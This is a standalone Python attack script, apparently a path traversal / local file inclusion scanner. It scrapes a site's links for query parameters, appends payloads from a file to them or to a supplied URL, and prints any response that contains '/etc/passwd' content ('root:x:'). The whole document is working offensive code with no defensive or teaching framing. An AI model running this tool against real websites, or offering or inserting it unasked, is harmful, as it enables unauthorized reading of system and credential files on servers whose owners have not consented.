import sys
import re
import requests
from urllib.parse import urljoin

# Check the number of arguments and validate them
if len(sys.argv) != 4:
    print("Usage: python script.py <0 or 1> <domain> <payload_file>")
    sys.exit(1)

# Extract the arguments
url_type = sys.argv[1]  # 0 for general URL, 1 for vulnerable URL
URL = sys.argv[2]
payload_file = sys.argv[3]

# Read payloads from file
try:
    with open(payload_file, 'r') as f:
        PAYLOADS = [line.strip() for line in f.readlines()]
except FileNotFoundError:
    print(f"[-] The file '{payload_file}' was not found. Please check the path.")
    sys.exit(1)

# Send request to the main URL
response = requests.get(URL, timeout=5)
print(f"[*] Response code: {response.status_code}")

# If URL is general (0), process normally
if url_type == "0":
    if response.status_code == 200:
        print("[*] Locating possible file paths...")

        # Look for various places where paths might be hidden (e.g., 'href', 'src', 'action', etc.)
        file = response.text
        # Extended regex for common path indicators like image source, links, forms, CSS, etc.
        matches = re.findall(r'(?:src|href|action|background|data-[^=]+|url\([^)]*\)|srcset)="(/[^"]+)"', file)
        if matches:
            found = False
            # Loop through matches to find one with '='
            for match in matches:
                fullurl = urljoin(URL, match)  # Properly combine base URL and path
                print("[+] Found potential file path:", fullurl)

                # Keep everything up to and including '='
                eq_index = fullurl.find('=')
                if eq_index != -1:
                    split = fullurl[:eq_index + 1]
                    print("[+] Split URL:", split)

                    # Now add payloads one by one
                    for payload in PAYLOADS:
                        url = f"{split}{payload}"
                        print("[*] Testing URL:", url)

                        try:
                            res = requests.get(url, timeout=5)
                            print("[*] Status:", res.status_code)

                            # Optional: Print contents if interesting
                            if res.status_code == 200 and "root:x:" in res.text:
                                print("[+] Interesting content found!")
                                print(res.text)
                                found = True
                        except requests.exceptions.RequestException as e:
                            print("[-] Error:", e)

                if found:
                    break  # Stop looking for more URLs once a match is found
            else:
                print("[-] No valid URLs found with '='.")
        else:
            print("[-] No matching paths found.")
    else:
        print(f"[-] Failed to fetch URL. Status code: {response.status_code}")

# If URL is vulnerable (1), brute force payloads
elif url_type == "1":
    print("[*] Brute forcing payloads on the vulnerable URL...")

    # Proceed with brute-forcing the payloads
    for payload in PAYLOADS:
        url = f"{URL}{payload}"
        print("[*] Testing URL:", url)

        try:
            res = requests.get(url, timeout=5)
            print("[*] Status:", res.status_code)

            # Check for common signs of exploitation, e.g., reading /etc/passwd
            if res.status_code == 200 and "root:x:" in res.text:
                print("[+] Potential vulnerability found!")
                print(res.text)

        except requests.exceptions.RequestException as e:
            print("[-] Error:", e)

else:
    print("[-] Invalid URL type. Use 0 for general URL or 1 for vulnerable URL.")
    sys.exit(1)
